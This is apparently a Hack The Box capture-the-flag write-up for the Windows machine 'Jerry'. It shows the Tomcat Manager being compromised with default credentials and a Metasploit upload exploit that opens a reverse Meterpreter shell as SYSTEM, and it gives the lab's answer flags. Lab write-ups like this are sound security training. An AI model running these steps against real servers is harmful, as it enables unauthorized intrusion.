---
title: 'Jerry'
date: '2026-09-07'
excerpt: 'Easy - Windows'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Jerry</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Jerry is an easy-difficulty Windows machine that showcases how to exploit Apache Tomcat, leading to an NT Authority\SYSTEM shell, thus fully compromising the target.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> Which TCP port is open on the remote host?</p>
<p class="mb-3">Run <code>nmap -sC -sV -A [TARGET_IP] -Pn</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.136.9 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-06 20:55 EDT
Nmap scan report for 10.129.136.9
Host is up (0.27s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.53 seconds
```

<p class="mb-5"><strong>Answer:</strong> 8080</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> Which web server is running on the remote host? Looking for two words.</p>
<p class="mb-5"><strong>Answer:</strong> Apache Tomcat</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> Which relative path on the webserver leads to the Web Application Manager?</p>
<p class="mb-3">Opening <code>http://[TARGET_IP]:8080</code> in the web browser and clicking on Manager App attempts a sign in to the page.</p>
<p class="mb-5"><strong>Answer:</strong> /manager/html</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password</p>
<p class="mb-3">Trying a few possible default credentials leads to a successful login.</p>
<p class="mb-5"><strong>Answer:</strong> tomcat:s3cret</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?</p>
<p class="mb-3">In the Web Application Manager, scroll down a little and notice the file upload capability.</p>

![Jerry1](/images/jerry_hackthebox_image1.png)

<p class="mb-5"><strong>Answer:</strong> war</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Submit the flag located on the user's desktop.</p>
<p class="mb-3">In Metasploit search for tomcat and use <code>exploit/multi/http/tomcat_mgr_upload</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search tomcat

Matching Modules
================

   #   Name                                                                       Disclosure Date  Rank       Check  Description
   -   ----                                                                       ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos                           2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1   exploit/multi/http/struts_dev_mode                                         2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_namespace_ognl                                  2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3     \_ target: Automatic detection                                           .                .          .      .
   4     \_ target: Windows                                                       .                .          .      .
   5     \_ target: Linux                                                         .                .          .      .
   6   exploit/multi/http/struts_code_exec_classloader                            2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   7     \_ target: Java                                                          .                .          .      .
   8     \_ target: Linux                                                         .                .          .      .
   9     \_ target: Windows                                                       .                .          .      .
   10    \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)  .                .          .      .
   11  auxiliary/admin/http/tomcat_ghostcat                                       2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   12  exploit/windows/http/tomcat_cgi_cmdlineargs                                2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   13  exploit/multi/http/tomcat_mgr_deploy                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   14    \_ target: Automatic                                                     .                .          .      .
   15    \_ target: Java Universal                                                .                .          .      .
   16    \_ target: Windows Universal                                             .                .          .      .
   17    \_ target: Linux x86                                                     .                .          .      .
   18  exploit/multi/http/tomcat_mgr_upload                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   19    \_ target: Java Universal                                                .                .          .      .
   20    \_ target: Windows Universal                                             .                .          .      .
   21    \_ target: Linux x86                                                     .                .          .      .
   22  auxiliary/dos/http/apache_tomcat_transfer_encoding                         2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   23  auxiliary/scanner/http/tomcat_enum                                         .                normal     No     Apache Tomcat User Enumeration
   24  exploit/linux/local/tomcat_rhel_based_temp_priv_esc                        2016-10-10       manual     Yes    Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation
   25  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                        2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
   26  exploit/multi/http/atlassian_confluence_webwork_ognl_injection             2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
   27    \_ target: Unix Command                                                  .                .          .      .
   28    \_ target: Linux Dropper                                                 .                .          .      .
   29    \_ target: Windows Command                                               .                .          .      .
   30    \_ target: Windows Dropper                                               .                .          .      .
   31    \_ target: PowerShell Stager                                             .                .          .      .
   32  exploit/windows/http/cayin_xpost_sql_rce                                   2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   33  exploit/multi/http/cisco_dcnm_upload_2019                                  2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   34    \_ target: Automatic                                                     .                .          .      .
   35    \_ target: Cisco DCNM 11.1(1)                                            .                .          .      .
   36    \_ target: Cisco DCNM 11.0(1)                                            .                .          .      .
   37    \_ target: Cisco DCNM 10.4(2)                                            .                .          .      .
   38  exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec               2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
   39    \_ target: Unix Command                                                  .                .          .      .
   40    \_ target: Linux Dropper                                                 .                .          .      .
   41  exploit/linux/http/cisco_hyperflex_file_upload_rce                         2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
   42    \_ target: Java Dropper                                                  .                .          .      .
   43    \_ target: Linux Dropper                                                 .                .          .      .
   44  exploit/linux/http/cpi_tararchive_upload                                   2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   45  exploit/linux/http/cisco_prime_inf_rce                                     2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   46  post/multi/gather/tomcat_gather                                            .                normal     No     Gather Tomcat Credentials
   47  auxiliary/dos/http/hashcollision_dos                                       2011-12-28       normal     No     Hashtable Collisions
   48  auxiliary/admin/http/ibm_drm_download                                      2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   49  exploit/multi/http/ivanti_epmm_rce_cve_2025_4427_4428                      2025-05-13       excellent  Yes    Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution
   50  exploit/linux/http/lucee_admin_imgprocess_file_write                       2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
   51    \_ target: Unix Command                                                  .                .          .      .
   52    \_ target: Linux Dropper                                                 .                .          .      .
   53  exploit/linux/http/mobileiron_core_log4shell                               2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
   54    \_ AKA: Log4Shell                                                        .                .          .      .
   55    \_ AKA: LogJam                                                           .                .          .      .
   56  exploit/multi/http/zenworks_configuration_management_upload                2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   57  exploit/multi/http/primefaces_weak_encryption_rce                          2016-02-15       excellent  Yes    Primefaces Remote Code Execution Exploit
   58  exploit/multi/http/spring_framework_rce_spring4shell                       2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
   59    \_ target: Java                                                          .                .          .      .
   60    \_ target: Linux                                                         .                .          .      .
   61    \_ target: Windows                                                       .                .          .      .
   62    \_ AKA: Spring4Shell                                                     .                .          .      .
   63    \_ AKA: SpringShell                                                      .                .          .      .
   64  auxiliary/admin/http/tomcat_administration                                 .                normal     No     Tomcat Administration Tool Default Access
   65  auxiliary/scanner/http/tomcat_mgr_login                                    .                normal     No     Tomcat Application Manager Login Utility
   66  exploit/multi/http/tomcat_partial_put_deserialization                      2025-03-10       excellent  Yes    Tomcat Partial PUT Java Deserialization
   67    \_ target: Unix Command                                                  .                .          .      .
   68    \_ target: Windows Command                                               .                .          .      .
   69  exploit/multi/http/tomcat_jsp_upload_bypass                                2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   70    \_ target: Automatic                                                     .                .          .      .
   71    \_ target: Java Windows                                                  .                .          .      .
   72    \_ target: Java Linux                                                    .                .          .      .
   73  auxiliary/admin/http/tomcat_utf8_traversal                                 2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   74  auxiliary/admin/http/trendmicro_dlp_traversal                              2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   75  post/windows/gather/enum_tomcat                                            .                normal     No     Windows Gather Apache Tomcat Enumeration


Interact with a module by name or index. For example info 75, use 75 or use post/windows/gather/enum_tomcat

[msf](Jobs:0 Agents:0) >> use 18
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
```

<p class="mb-3">In the options, it is necessary to set the username, password, remote hosts IP address, remote port and local host IP address.</p>

```console
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, soc
                                            ks5, socks5h
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  94.237.67.52     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set HttpPassword s3cret
HttpPassword => s3cret
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set HttpUsername tomcat
HttpUsername => tomcat
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set RHOSTS 10.129.136.9
RHOSTS => 10.129.136.9
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set RPORT 8080
RPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set LHOST 10.10.14.224
LHOST => 10.10.14.224
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> exploit
[*] Started reverse TCP handler on 10.10.14.224:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying ipF09BY8GfC...
[*] Executing ipF09BY8GfC...
[*] Sending stage (58073 bytes) to 10.129.136.9
[*] Undeploying ipF09BY8GfC ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.10.14.224:4444 -> 10.129.136.9:49192) at 2026-09-06 21:11:27 -0400

(Meterpreter 1)(C:\apache-tomcat-7.0.88) > shell
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

<p class="mb-3">In the target's system, running <code>whoami</code> returns <code>nt authority\system</code> which is the user with highest privileges.</p>

```console
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\

06/19/2018  04:07 AM    <DIR>          apache-tomcat-7.0.88
08/22/2013  06:52 PM    <DIR>          PerfLogs
06/19/2018  06:42 PM    <DIR>          Program Files
06/19/2018  06:42 PM    <DIR>          Program Files (x86)
06/18/2018  11:31 PM    <DIR>          Users
01/21/2022  09:49 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,419,732,480 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users

06/18/2018  11:31 PM    <DIR>          .
06/18/2018  11:31 PM    <DIR>          ..
06/18/2018  11:31 PM    <DIR>          Administrator
08/22/2013  06:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   2,419,732,480 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator

06/18/2018  11:31 PM    <DIR>          .
06/18/2018  11:31 PM    <DIR>          ..
06/19/2018  06:43 AM    <DIR>          Contacts
06/19/2018  07:09 AM    <DIR>          Desktop
06/19/2018  06:43 AM    <DIR>          Documents
01/21/2022  09:23 PM    <DIR>          Downloads
06/19/2018  06:43 AM    <DIR>          Favorites
06/19/2018  06:43 AM    <DIR>          Links
06/19/2018  06:43 AM    <DIR>          Music
06/19/2018  06:43 AM    <DIR>          Pictures
06/19/2018  06:43 AM    <DIR>          Saved Games
06/19/2018  06:43 AM    <DIR>          Searches
06/19/2018  06:43 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   2,419,732,480 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,419,732,480 bytes free

C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,732,480 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>
```

<p class="mb-5"><strong>Answer:</strong> 7004dbcef0f854e0fb401875f26ebd00</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> Submit the flag located on the administrator's desktop.</p>
<p class="mb-5"><strong>Answer:</strong> 04a8b36e1545a455393d067e772fe90e</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>